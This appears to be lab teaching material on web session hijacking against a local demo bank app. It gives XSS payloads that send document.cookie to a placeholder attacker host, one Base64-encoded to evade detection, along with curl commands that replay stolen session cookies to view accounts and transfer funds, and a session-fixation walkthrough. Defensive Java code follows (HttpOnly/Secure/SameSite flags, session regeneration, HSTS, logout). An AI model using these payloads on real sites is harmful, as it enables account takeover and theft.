// HTTP Request WITHOUT session (not logged in):
// GET /account HTTP/1.1
// Host: bank.com
// (no cookie)
// → Server responds: 302 Redirect to /login

// HTTP Request WITH session (logged in):
// GET /account HTTP/1.1
// Host: bank.com
// Cookie: JSESSIONID=node0abc123xyz.node0
// → Server responds: 200 OK (shows your account!)

// The ONLY difference is the Cookie header.
// If an attacker sends the same Cookie header,
// they see YOUR account.

// CHECK COOKIE FLAGS IN BROWSER:
// F12 → Storage tab (Firefox) or Application tab (Chrome)
// → Cookies → http://localhost:15000
//
// Look for JSESSIONID row:
// ┌──────────┬─────────┬───────────────────┐
// │ Flag     │ Value   │ What it means     │
// ├──────────┼─────────┼───────────────────┤
// │ HttpOnly │ false ✗ │ JS can steal it!  │
// │ Secure   │ false ✗ │ Sent over HTTP!   │
// │ SameSite │ (empty) │ No CSRF protect!  │
// └──────────┴─────────┴───────────────────┘
// ALL THREE missing = maximum vulnerability

// JAVA CODE TO SET FLAGS:
Cookie c = new Cookie("JSESSIONID", sessionId);
c.setHttpOnly(true);   // JS blocked
c.setSecure(true);     // HTTPS only
c.setMaxAge(1800);     // 30min timeout
response.addCookie(c);

// STEP 1: Start the listener
// Terminal:
// python3 -m http.server 8000
// Output: Serving HTTP on 0.0.0.0 port 8000 ...

// STEP 2: Test it works
// In another terminal or browser:
// curl http://localhost:8000/?test=hello
// Server log shows:
// 127.0.0.1 - [date] "GET /?test=hello HTTP/1.1" 200 -

// STEP 3: Now the XSS payload will send cookies here:
// <script>
// new Image().src = 'http://ATTACKER:8000/?c=' + document.cookie;
// </script>
// Server log shows:
// 127.0.0.1 - [date] "GET /?c=JSESSIONID=node0abc HTTP/1.1" 200 -
//                              ^^^^^^^^^^^^^^^^^
//                              STOLEN COOKIE!

// METHOD 1 — Image (most reliable):
<script>
var img = new Image();
img.src = 'http://attacker:8000/?c=' + document.cookie;
</script>
// Browser tries to load an 'image' from attacker's server
// The cookie is in the URL query string
// Works even with basic CSP because images are usually allowed

// METHOD 2 — Hidden iframe + redirect:
<script>
var iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = 'http://attacker:8000/?c=' + document.cookie;
document.body.appendChild(iframe);
</script>

// METHOD 3 — Encoded to avoid detection:
<script>
var c = btoa(document.cookie);  // Base64 encode
new Image().src = 'http://attacker:8000/?d=' + c;
</script>
// Attacker decodes: echo 'encoded_string' | base64 -d

// Server log with multiple captured sessions:
//
// 127.0.0.1 - [06/Mar 18:19] GET /?c=JSESSIONID=node016d4q... 200
// 127.0.0.1 - [06/Mar 19:26] GET /?c=JSESSIONID=node016d4q... 200
// 127.0.0.1 - [06/Mar 19:27] GET /?c=JSESSIONID=node016d4q... 200
// 127.0.0.1 - [06/Mar 19:28] GET /?c=JSESSIONID=node01ph03... 200
//                                                ^^^^^^^^^
//                                   DIFFERENT session = DIFFERENT user!

// Analysis:
// Lines 1-3: Same JSESSIONID (node016d4q) — same user, 3 visits
// Line 4: Different JSESSIONID (node01ph03) — NEW victim!

// Extract just the cookie values:
// grep -o 'JSESSIONID=[^ ]*' server.log | sort -u
// JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0
// JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0

// STEP 1: View victim's account
// curl http://localhost:15000/account \
//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'
// Response: HTML showing victim's balance, card number, profile

// STEP 2: Transfer funds as the victim
// curl -X POST http://localhost:15000/transfer \
//   -H 'Content-Type: application/x-www-form-urlencoded' \
//   -d 'to=999999&transferAmount=500' \
//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'
// Response: 302 redirect (transfer successful)

// STEP 3: Verify the theft
// curl http://localhost:15000/account \
//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'
// Response: Balance has DECREASED by 500$!

// The victim's balance dropped and they have NO idea.
// No password was needed. No login alert was triggered.
// Just a cookie.

// SESSION FIXATION ATTACK:

// Step 1: Attacker visits bank.com, gets session ID 'AAA'
// Step 2: Attacker sends victim a link:
//   http://bank.com/login?JSESSIONID=AAA
// Step 3: Victim clicks link, logs in
//   Victim is now authenticated with session ID 'AAA'
// Step 4: Attacker uses session ID 'AAA' (they already know it!)
//   Attacker is now logged in as the victim!

// DEFENCE — Regenerate on login:
protected void doPost(HttpServletRequest req, ...) {
    // Verify username + password...
    if (authenticated) {
        req.getSession().invalidate();  // Kill old session
        HttpSession newSession = req.getSession(true);  // New ID!
        newSession.setAttribute("user", username);
    }
}
// Old session ID 'AAA' is now DEAD.
// Attacker's known ID is useless.

// SET SESSION TIMEOUT (Java):
// In web.xml:
// <session-config>
//   <session-timeout>30</session-timeout>  <!-- 30 minutes -->
// </session-config>

// PROGRAMMATIC TIMEOUT:
HttpSession session = request.getSession();
session.setMaxInactiveInterval(1800);  // 30 min in seconds

// EXPLICIT LOGOUT:
protected void doGet(HttpServletRequest req, ...) {
    HttpSession session = req.getSession(false);
    if (session != null) {
        session.invalidate();  // Destroy session server-side
    }
    // Expire the cookie client-side:
    Cookie c = new Cookie("JSESSIONID", "");
    c.setMaxAge(0);  // Immediate expiry
    c.setPath("/");
    response.addCookie(c);
    response.sendRedirect("/login");
}
// After logout, the stolen cookie returns: 'session not found'

// WITHOUT SECURE FLAG:
// HTTP request (unencrypted):
// GET /account HTTP/1.1
// Host: bank.com
// Cookie: JSESSIONID=abc123  ← VISIBLE TO EVERYONE ON WIFI!

// WITH SECURE FLAG:
// The browser REFUSES to send the cookie over HTTP.
// Only sends it over HTTPS (encrypted).
// Even if someone captures the packet, they see:
// 17 03 03 00 1a 8f 2e ... (encrypted bytes)
// The cookie value is HIDDEN inside the encryption.

// JAVA CODE:
Cookie c = new Cookie("JSESSIONID", sessionId);
c.setSecure(true);  // HTTPS only!
response.addCookie(c);

// If the site also has HSTS header:
// Strict-Transport-Security: max-age=31536000
// The browser automatically upgrades HTTP → HTTPS
// So the cookie is NEVER sent unencrypted.

// DETECTION CODE (Java filter):
public class SessionSecurityFilter implements Filter {
    public void doFilter(ServletRequest req, ...) {
        HttpServletRequest httpReq = (HttpServletRequest) req;
        HttpSession session = httpReq.getSession(false);
        if (session != null) {
            String currentIP = httpReq.getRemoteAddr();
            String savedIP = (String) session.getAttribute("client_ip");

            if (savedIP != null && !savedIP.equals(currentIP)) {
                // IP CHANGED! Possible hijacking!
                session.invalidate();
                ((HttpServletResponse)resp).sendRedirect("/login?reason=security");
                return;
            }
            session.setAttribute("client_ip", currentIP);
        }
        chain.doFilter(req, resp);
    }
}
// This catches curl replays from different IPs!

// COMPLETE SECURE SESSION SETUP:

// 1. Cookie flags (at session creation):
Cookie c = new Cookie("JSESSIONID", id);
c.setHttpOnly(true);
c.setSecure(true);
c.setMaxAge(1800);
c.setPath("/");
resp.setHeader("Set-Cookie", c.getName() + "=" + c.getValue()
    + "; HttpOnly; Secure; SameSite=Strict; Path=/");

// 2. Regenerate on login:
session.invalidate();
HttpSession newSession = req.getSession(true);

// 3. HSTS header:
resp.setHeader("Strict-Transport-Security",
    "max-age=31536000; includeSubDomains");

// 4. Logout handler:
session.invalidate();
Cookie expired = new Cookie("JSESSIONID", "");
expired.setMaxAge(0);
resp.addCookie(expired);

// With ALL of these:
// - XSS can't read cookie (HttpOnly)
// - Network can't intercept (Secure + HSTS)
// - Cross-site can't use it (SameSite)
// - Stolen cookies expire fast (MaxAge)
// - Old cookies die on logout (invalidate)

// FIRESHEEP ATTACK (2010):
// 1. Attacker installs Firesheep in Firefox
// 2. Connects to coffee shop WiFi
// 3. Firesheep captures all HTTP cookies on the network
// 4. Shows a list of all logged-in users on the sidebar
// 5. Attacker clicks a user → instant access to their Facebook!

// WHY IT WORKED:
// - Facebook used HTTPS for login but HTTP for browsing
// - Session cookie sent over unencrypted HTTP
// - Anyone on the WiFi could read it

// THE FIX:
// Facebook (and most sites) switched to HTTPS everywhere
// + Secure flag on cookies
// + HSTS headers
// Firesheep became useless overnight.

// LESSON:
// One missing flag (Secure) enabled millions of account hijacks.
// The fix was simple. The damage before the fix was enormous.

